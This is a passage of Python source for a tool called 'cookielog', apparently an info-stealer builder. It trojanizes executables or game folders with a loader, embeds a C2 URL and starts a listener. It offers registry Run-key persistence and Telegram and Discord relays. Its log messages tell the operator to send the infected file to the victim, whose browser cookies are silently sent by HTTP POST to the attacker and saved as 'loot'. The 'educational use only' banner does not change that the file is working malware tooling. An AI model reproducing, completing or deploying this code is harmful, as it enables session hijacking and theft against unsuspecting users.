                log("[-] nothing selected")
                continue
            if gui_tg: telegram = gui_tg
            if gui_dc: discord = gui_dc
            if gui_persist: persist = True
            run_one(host_path, mode, gui_run, port, telegram, discord, persist)

        elif cmd == "infect":
            if not rest:
                log("usage: infect <path> [--run] [--persist]")
                log("  path can be a folder or a .exe")
                log("  --run: run locally after infecting (test)")
                continue
            # Parse the rest
            sub = rest.split()
            host_path = ""
            run_flag = False
            persist_flag = persist  # inherit current
            j = 0
            while j < len(sub):
                if sub[j] == "--run":
                    run_flag = True
                elif sub[j] == "--persist":
                    persist_flag = True
                else:
                    if host_path:
                        host_path += " " + sub[j]
                    else:
                        host_path = sub[j]
                j += 1

            if not os.path.exists(host_path):
                log("[-] path does not exist: %s" % host_path)
                continue

            if os.path.isdir(host_path):
                mode = "folder"
            else:
                mode = "file"

            if persist_flag and not persist:
                persist = True
                cfg["persist"] = True
                save_config(cfg)

            run_one(host_path, mode, run_flag, port, telegram, discord, persist_flag)

        else:
            log("invalid command: '%s' -- type 'help' for command list" % cmd)


def run_one(host_path, mode, run_local, port, telegram, discord, persist):
    """Execute the full infect flow for a single target."""
    log("=" * 60)
    log("  cookielog -- infecting %s" % os.path.basename(host_path))
    log("=" * 60)

    # 1. ensure binaries
    log("\n[1/5] checking binaries...")
    if not ensure_build():
        log("[-] cannot continue without binaries")
        return

    # 2. detect IP
    log("\n[2/5] detecting attacker IP...")
    ip = detect_ip()
    c2_url = "http://%s:%d/" % (ip, port)
    log("[+] C2 URL: %s" % c2_url)
    if telegram:
        log("[+] Telegram relay: enabled")
    if discord:
        log("[+] Discord relay: enabled")
    if persist:
        log("[+] Persistence: enabled (registry Run key)")
    if run_local:
        c2_url = "http://127.0.0.1:%d/" % port
        log("[+] C2 URL (local test): %s" % c2_url)

    # 3. start listener
    log("\n[3/5] starting listener...")
    listener = start_listener(port, telegram, discord)
    if not listener:
        log("[-] could not start listener")
        return

    # 4. infect
    log("\n[4/5] infecting...")
    try:
        if mode == "folder":
            out_path, orig_exe = build_infected_folder(host_path, c2_url, persist)
            if not out_path:
                listener.terminate()
                return
            folder_name = os.path.basename(os.path.abspath(host_path))
            log("\n" + "=" * 60)
            if run_local:
                log("  LOCAL TEST -- running from ifec/folds/%s/" % folder_name)
            else:
                log("  READY -- send ifec/folds/%s/ to the victim" % folder_name)
            log("=" * 60)
        else:
            out_path = build_infected_standalone(host_path, c2_url, persist)
            bname = os.path.basename(out_path)
            log("[+] infected: ifec/apps/%s" % bname)
            log("[+] C2 URL embedded: %s" % c2_url)
    except Exception as ex:
        log("[-] infection failed: %s" % ex)
        listener.terminate()
        return

    # 5. run locally or wait
    if run_local:
        try:
            if mode == "folder":
                run_infected_locally(None, out_path, is_folder=True)
            else:
                run_infected_locally(host_path, out_path, is_folder=False)
        except Exception as ex:
            log("[!] local run failed: %s" % ex)
            if mode == "file":
                backup = host_path + ".orig"
                if os.path.exists(backup):
                    shutil.copy2(backup, host_path)
                    os.remove(backup)
                    log("[+] original .exe restored after error")

    # 6. wait for cookies
    try:
        wait_for_cookies(timeout=300)
    except KeyboardInterrupt:
        pass

    listener.terminate()
    log("\n[*] done. cookies in loot/cookies.json + loot/session_cookies.json")

# ------------------------------------------------------------------ main

def main():
    # If no arguments, ask: GUI or terminal?
    if len(sys.argv) == 1:
        log("=" * 60)
        log("  cookielog -- educational security research tool")
        log("  EDUCATIONAL USE ONLY -- FOR SECURITY RESEARCH / TRAINING")
        log("=" * 60)
        log("")
        log("  [1] GUI mode      (graphical interface -- pick folder/exe)")
        log("  [2] Terminal mode (interactive command line)")
        log("  [3] Quick infect   (skip menu, use CLI args)")
        log("")
        try:
            choice = input("  choose [1/2/3] (default 1): ").strip()
        except (EOFError, KeyboardInterrupt):
            return 0

        if choice == "2" or choice.lower() == "terminal":
            interactive_loop()
            return 0
        elif choice == "3":
            log("[*] pass args: python auto.py <path> [--run] [--persist] [--telegram ...] [--discord ...]")
            return 0
        # default: GUI mode (fall through)

    port = 9090
    host_arg = None
    run_local = False
    telegram = None
    discord = None
    persist = False
    show_cfg = False
    clear_tg = False
    clear_dc = False

    # parse args
    args = sys.argv[1:]
    i = 0
    while i < len(args):
        a = args[i]
        if a == "--port" and i + 1 < len(args):
            port = int(args[i + 1]); i += 2
        elif a == "--run":
            run_local = True; i += 1
        elif a == "--cli":
            i += 1
        elif a == "--telegram" and i + 1 < len(args):
            telegram = args[i + 1]; i += 2
        elif a == "--discord" and i + 1 < len(args):
            discord = args[i + 1]; i += 2
        elif a == "--persist":
            persist = True; i += 1
        elif a == "--config":
            show_cfg = True; i += 1
        elif a == "--clear-telegram":
            clear_tg = True; i += 1
        elif a == "--clear-discord":
            clear_dc = True; i += 1
        elif not a.startswith("--"):
            # join remaining non-flag args as the host path (handles spaces)
            parts = []
            while i < len(args) and not args[i].startswith("--"):
                parts.append(args[i]); i += 1
            host_arg = " ".join(parts)
        else:
            i += 1

    # --config: show saved settings and exit
    if show_cfg:
        show_config()
        return 0

    # --clear-telegram / --clear-discord: remove from config and exit
    if clear_tg or clear_dc:
        cfg = load_config()
        if clear_tg:
            cfg.pop("telegram", None)
            log("[+] Telegram cleared from config")
        if clear_dc:
            cfg.pop("discord", None)
            log("[+] Discord cleared from config")
        save_config(cfg)
        return 0

    # Load saved config for values not passed via CLI
    cfg = load_config()
    if telegram is None and cfg.get("telegram"):
        telegram = cfg["telegram"]
        log("[*] Telegram: loaded from config.json")
    if discord is None and cfg.get("discord"):
        discord = cfg["discord"]
        log("[*] Discord: loaded from config.json")
    if not persist and cfg.get("persist"):
        persist = True
        log("[*] Persist: loaded from config.json")
    if port == 9090 and cfg.get("port"):
        port = cfg["port"]

    # Save new values to config if provided via CLI
    cfg_new = load_config()
    changed = False
    if telegram and telegram != cfg_new.get("telegram"):
        cfg_new["telegram"] = telegram
        changed = True
    if discord and discord != cfg_new.get("discord"):
        cfg_new["discord"] = discord
        changed = True
    if persist != bool(cfg_new.get("persist")):
        cfg_new["persist"] = persist
        changed = True
    if port != cfg_new.get("port"):
        cfg_new["port"] = port
        changed = True
    if changed:
        save_config(cfg_new)
        log("[+] config.json updated")

    log("=" * 60)
    log("  cookielog -- automatic payload setup")
    log("=" * 60)

    # 1. ensure binaries
    log("\n[1/5] checking binaries...")
    if not ensure_build():
        log("[-] cannot continue without binaries")
        return 1

    # 2. detect IP + build C2 URL
    log("\n[2/5] detecting attacker IP...")
    ip = detect_ip()
    c2_url = "http://%s:%d/" % (ip, port)
    log("[+] C2 URL: %s" % c2_url)
    if telegram:
        log("[+] Telegram relay: enabled")
    if discord:
        log("[+] Discord relay: enabled")
    if persist:
        log("[+] Persistence: enabled (registry Run key)")
    if ip == "127.0.0.1":
        log("[!] could not detect local IP -- using 127.0.0.1 (localhost only)")
    if run_local:
        log("[*] mode: LOCAL TEST (will run infected exe on this machine)")
        c2_url = "http://127.0.0.1:%d/" % port
        log("[+] C2 URL (local test): %s" % c2_url)

    # 3. get target (file or folder)
    log("\n[3/5] selecting target...")
    if host_arg:
        host_path = host_arg
        if os.path.isdir(host_path):
            mode = "folder"
        elif os.path.isfile(host_path):
            mode = "file"
        else:
            log("[-] path does not exist: %s" % host_path)
            return 1
        log("[+] target (%s): %s" % (mode, host_path))
    else:
        host_path, mode, gui_run, gui_tg, gui_dc, gui_persist = pick_gui()
        if not host_path:
            log("[-] nothing selected")
            return 1
        if gui_run:
            run_local = True
            c2_url = "http://127.0.0.1:%d/" % port
        # GUI values override config (if user typed something)
        if gui_tg:
            telegram = gui_tg
        if gui_dc:
            discord = gui_dc
        if gui_persist:
            persist = True
        log("[+] target (%s): %s" % (mode, host_path))
        if run_local:
            log("[+] mode: LOCAL TEST (run locally)")

    # 4. start listener
    log("\n[4/5] starting listener...")
    listener = start_listener(port, telegram, discord)
    if not listener:
        log("[-] could not start listener")
        return 1

    # 5. infect
    log("\n[5/5] infecting...")
    try:
        if mode == "folder":
            out_path, orig_exe = build_infected_folder(host_path, c2_url, persist)
            if not out_path:
                listener.terminate()
                return 1
            folder_name = os.path.basename(os.path.abspath(host_path))
            log("\n" + "=" * 60)
            if run_local:
                log("  LOCAL TEST -- running from ifec/folds/%s/" % folder_name)
            else:
                log("  READY -- send ifec/folds/%s/ to the victim" % folder_name)
                log("  when the victim runs it:")
                log("    - the original app/game opens normally")
                log("    - payload extracts cookies from the VICTIM's machine")
                log("    - cookies are sent via HTTP POST to %s" % c2_url)
                log("  cookies will appear in loot/cookies.json")
            log("=" * 60)
        else:
            out_path = build_infected_standalone(host_path, c2_url, persist)
            bname = os.path.basename(out_path)
            log("[+] infected: ifec/apps/%s" % bname)
            log("    loader: %d KB + host: %d KB = %d KB" % (
                os.path.getsize(LOADER) // 1024,
                os.path.getsize(host_path) // 1024,
                os.path.getsize(out_path) // 1024))
            log("[+] C2 URL embedded: %s" % c2_url)
            log("\n" + "=" * 60)
            if run_local:
                log("  LOCAL TEST -- running infected exe on this machine")
            else:
                log("  READY -- send ifec/apps/%s to the victim" % bname)
                log("  when the victim runs it:")
                log("    - the original app/game opens normally")
                log("    - payload extracts cookies from the VICTIM's machine")
                log("    - cookies are sent via HTTP POST to %s" % c2_url)
                log("  cookies will appear in loot/cookies.json")
            log("=" * 60)
    except Exception as ex:
        log("[-] infection failed: %s" % ex)
        listener.terminate()
        return 1

    # 6. run locally or wait for cookies
    if run_local:
        try:
            if mode == "folder":
                run_infected_locally(None, out_path, is_folder=True)
            else:
                run_infected_locally(host_path, out_path, is_folder=False)
        except Exception as ex:
            log("[!] local run failed: %s" % ex)
            if mode == "file":
                backup = host_path + ".orig"
                if os.path.exists(backup):
                    shutil.copy2(backup, host_path)
                    os.remove(backup)
                    log("[+] original .exe restored after error")

    # 7. wait for cookies
    try:
        wait_for_cookies(timeout=300)
    except KeyboardInterrupt:
        log("\n[*] interrupted by user")
    finally:
        if listener.poll() is None:
            listener.terminate()
            log("[*] listener stopped")

    return 0

if __name__ == "__main__":
    sys.exit(main())
